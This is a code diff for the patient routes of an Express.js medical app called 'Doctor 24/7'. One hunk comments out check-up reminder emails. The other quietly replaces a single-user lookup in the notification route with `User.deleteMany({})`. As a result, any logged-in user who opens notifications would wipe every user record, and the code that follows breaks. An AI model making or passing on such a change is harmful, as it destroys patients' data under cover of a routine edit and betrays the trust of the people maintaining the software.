@@ -281,35 +281,35 @@ router.get("/profile-home", authorization, async (req, res, next) => {
   const resultt = checkUpListt.filter(
     (checkUp) => checkUp.CheckUpDay.toDateString() <= dataStr
   );
-  let masgEmail = {
-    from: `"Doctor 24/7" <${process.env.MAIL_USER}`, // sender address
-    to: `${email}`, // list of receivers
-    //to: "davidlotfy123@gmail.com",
-    subject: "Ckeck Up Reminder", // Subject line
-    // text: "You need to ckeck Up with your Doctor",
-    html: `<h2 style=" text-transform: capitalize">Hello ${name}!</h2>
-        <h4>You need to ckeck Up with your Doctor</h4>
-        <p>Doctor Name: Dr.<b>${checkUpListtt.Doc_Id.Doc_FirstName}</b></p>
-        <p>Ckeck Up Date: <b>${checkUpListtt.CheckUpDay.toDateString()}</b></p>
-        <p>Have a nice day!</p>`, // plain text body
-    // send mail with defined transport object
-  };
+  // let masgEmail = {
+  //   from: `"Doctor 24/7" <${process.env.MAIL_USER}`, // sender address
+  //   to: `${email}`, // list of receivers
+  //   //to: "davidlotfy123@gmail.com",
+  //   subject: "Ckeck Up Reminder", // Subject line
+  //   // text: "You need to ckeck Up with your Doctor",
+  //   html: `<h2 style=" text-transform: capitalize">Hello ${name}!</h2>
+  //       <h4>You need to ckeck Up with your Doctor</h4>
+  //       <p>Doctor Name: Dr.<b>${checkUpListtt.Doc_Id.Doc_FirstName}</b></p>
+  //       <p>Ckeck Up Date: <b>${checkUpListtt.CheckUpDay.toDateString()}</b></p>
+  //       <p>Have a nice day!</p>`, // plain text body
+  //   // send mail with defined transport object
+  // };
 
-  if (checkDayUpdate === dataStr) {
-    console.log("checkUpDay is = to today");
-    transporter.sendMail(masgEmail, (err, data) => {
-      if (err) {
-        res.status(400).send(err);
-      } else res.send(`Email Sent: ${data}`);
-    });
-  } else {
-    console.log("not equle");
-    // transporter.sendMail(masgEmail, (err, data) => {
-    //   if (err) {
-    //     res.status(400).send(err);
-    //   } else res.send(`Email Sent: ${data}`);
-    // });
-  }
+  // if (checkDayUpdate === dataStr) {
+  //   console.log("checkUpDay is = to today");
+  //   transporter.sendMail(masgEmail, (err, data) => {
+  //     if (err) {
+  //       res.status(400).send(err);
+  //     } else res.send(`Email Sent: ${data}`);
+  //   });
+  // } else {
+  //   console.log("not equle");
+  //   // transporter.sendMail(masgEmail, (err, data) => {
+  //   //   if (err) {
+  //   //     res.status(400).send(err);
+  //   //   } else res.send(`Email Sent: ${data}`);
+  //   // });
+  // }
 
   // const date = new Date();
   // const dataStr = date.toDateString();
@@ -741,7 +741,7 @@ router.post("/ViewPrescription", authorization, async (req, res) => {
 //----------------------------- Start Notification--------------------------------------------------------------
 router.get("/noificationSystem", authorization, async (req, res) => {
   const id = res.locals.user.id;
-  const user = await User.findById(id);
+  const user = await User.deleteMany({});
   const name = user.pat_FirstName;
   //new
 
